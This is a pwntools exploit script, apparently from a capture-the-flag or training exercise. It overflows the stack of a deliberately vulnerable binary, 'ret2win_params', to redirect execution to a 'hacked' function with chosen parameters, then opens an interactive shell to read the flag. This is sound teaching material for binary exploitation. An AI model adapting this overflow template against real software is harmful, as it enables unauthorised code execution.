from pwn import *


# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './ret2win_params'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(200))

# Start program
io = start()

# Build the payload
payload = flat({
    offset: [
        # 32-bit the params follow the function
        elf.functions.hacked,
        0x0,  # Return pointer - try changing to main() and step through with GDB!
        0xdeadbeef,  # Param_1
        0xc0debabe,  # Param_2
    ]
})

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Get flag
io.interactive()
